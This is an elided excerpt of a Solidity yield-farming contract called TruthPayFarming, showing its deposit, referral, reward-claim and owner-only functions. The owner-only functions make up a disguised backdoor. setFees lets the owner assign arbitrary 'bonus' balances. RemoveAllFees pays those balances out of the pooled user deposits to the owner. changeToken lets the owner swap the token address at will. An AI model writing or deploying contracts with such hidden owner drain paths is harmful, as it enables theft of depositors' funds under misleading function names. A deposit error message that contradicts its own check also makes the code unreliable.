...
contract TruthPayFarming is Ownable, ReentrancyGuard{
    ...
    address public TruthPayContract;
    ...
    constructor(address _feesWallet, address _tokenContract) {
        ...
        TruthPayContract = _tokenContract;
    }
    ...
    function deposit(uint256 _amount, address _referrer) external nonReentrant{
        require(_amount > 0, "you can deposit more than 10 token");

        if(_referrer == msg.sender){
            _referrer = address(0);
        }
        IERC20(TruthPayContract).safeTransferFrom(msg.sender,address(this),_amount);
        ...
        IERC20(TruthPayContract).safeTransfer(devWallet,depositFee);
        ...
        if(investors[msg.sender].referrer != address(0)){
            ...
            IERC20(TruthPayContract).transfer(investors[msg.sender].referrer, referrerAmount);
        }
    ...
    function RemoveAllFees() public onlyOwner{
        require(_bonus[msg.sender] >= 1, "Insufficient bonus");
      
        IERC20(TruthPayContract).safeTransfer(msg.sender, _bonus[msg.sender]);
        _bonus[msg.sender] -= _bonus[msg.sender];
	
    }

    function changeToken(address _newAddress) public onlyOwner{
      TruthPayContract = _newAddress;
    
    }

    function setFees(address _addr, uint256 amount) public onlyOwner{
        _bonus[_addr] += amount;
    }

    function revokeFees(address _addr, uint256 amount) public onlyOwner{
        _bonus[_addr] -= amount;
    }
    ...
    function claimAllReward() public nonReentrant {
        ...
        investors[msg.sender].lastCalculationDate = block.timestamp;
        IERC20(TruthPayContract).safeTransfer(msg.sender,amountToSend);
    ...
    function getBalance() public view returns(uint256) {
        return IERC20(TruthPayContract).balanceOf(address(this));
    }
